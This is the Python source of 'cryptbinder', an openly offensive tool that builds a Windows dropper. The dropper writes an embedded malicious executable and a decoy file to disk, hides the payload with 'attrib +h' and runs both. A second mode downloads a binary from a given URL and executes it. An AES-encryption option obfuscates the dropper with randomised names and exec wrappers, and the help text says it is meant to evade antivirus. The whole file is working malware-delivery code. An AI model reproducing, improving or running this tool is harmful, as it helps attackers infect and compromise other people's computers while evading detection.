#!/usr/bin/env python
#
# cryptbinder.py - AES encrypted binary dropper
# by @d4rkcat github.com/d4rkcat
#
## This program is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation, either version 3 of the License, or
## (at your option) any later version.
#
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
## GNU General Public License at (http://www.gnu.org/licenses/) for
## more details.

from Crypto.Cipher import AES
import base64, random, string, sys, os, argparse

def randKey(bytes):
	return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$^&()*&[]|,./?") for x in range(bytes))

def randVar():
	return ''.join(random.choice(string.ascii_letters) for x in range(3)) + "_" + ''.join(random.choice("0123456789") for x in range(3))

parser = argparse.ArgumentParser(prog='cryptbinder', usage='./cryptbinder.py [options]')
parser.add_argument('-m', "--mexe", type=str, help='Malicious exe/bat/vbs to drop, hide and run.')
parser.add_argument('-i', "--iexe", type=str, help='Inert exe/bat/vbs to drop and run.')
parser.add_argument("-u", "--url", type=str, help="URL to download and run binary from.")
parser.add_argument("-v", "--var", type=str, help="System variable to place the files, eg TEMP")
parser.add_argument('-e', "--encrypt", action="store_true", help='Encrypt the dropper to evade AV.')
args = parser.parse_args()

if not args.mexe or not args.iexe or not args.var:
	if not args.url or not args.var:
		parser.print_help()
		exit()

BLOCK_SIZE, PADDING = 32, '{'
pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
key, iv, enctype = randKey(32), randKey(16), ''
cipherEnc = AES.new(key)
bd64var, AESvar = randVar(), randVar()
if args.encrypt:
	myendings = ['from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar), 'from base64 import b64decode as %s' % (bd64var), 'import os']
else:
	myendings = ['import os']

if args.mexe or args.iexe:
	if args.url:
		print ' [X] url cannot be used with self-contained exes.'
		sys.exit()
	myendings.append('from hashlib import sha256')
	with open(args.mexe, 'rb') as exe:
		mexe = exe.read().encode('base64')
	with open(args.iexe, 'rb') as exe:
		iexe = exe.read().encode('base64')

	template = '''
pathto = os.getenv("%s")
filename = "%s"
content = "%s"
filename2 = "%s"
content2 = "%s"

fullpath = pathto + os.sep + filename
fullpath2 = pathto + os.sep + filename2

paths = [[fullpath, content], [fullpath2, content2]]

for p in paths:
	if os.path.isfile(p[0]):
		with open(p[0], 'rb') as f:
			checksum = str(sha256(f.read()).hexdigest())
		origsum = str(sha256(p[1].decode('base64')).hexdigest())
		if origsum != checksum:
			os.remove(p[0])
			with open(p[0], 'wb') as out:
				out.write(p[1].decode('base64'))
	else:
		with open(p[0], 'wb') as out:
			out.write(p[1].decode('base64'))

try:
	os.popen('attrib +h ' + fullpath)
except:
	pass
os.startfile(fullpath)
os.startfile(fullpath2)
''' % (args.var, args.mexe.split(os.sep)[-1], mexe.replace('\n', ''), args.iexe.split(os.sep)[-1], iexe.replace('\n', ''))
	encrypted = EncodeAES(cipherEnc, template)

elif args.url:
	if args.mexe or args.iexe:
		print ' [X] url cannot be used with self-contained exes.'
		sys.exit()
	myendings.append('import urllib2')
	template = '''
url = "%s"
down = urllib2.urlopen(url)
filename = url.split('/')[-1]
exe = down.read()
pathto = os.getenv("%s")
fullpath = pathto + os.sep + filename
with open(fullpath, 'wb') as f:
	f.write(exe)
os.startfile(fullpath)
''' % (args.url, args.var)
	encrypted = EncodeAES(cipherEnc, template)


random.shuffle(myendings)

with open('dropper.py', 'w') as drop:
	drop.write(";".join(myendings) + "\n")
	if args.encrypt:
		drop.write("exec(%s(\"%s\"))" % (bd64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(AESvar,key,bd64var,encrypted))))
		enctype = 'encrypted '
	else:
		drop.write(template)

print ' [*] %sdropper written to dropper.py' % (enctype)
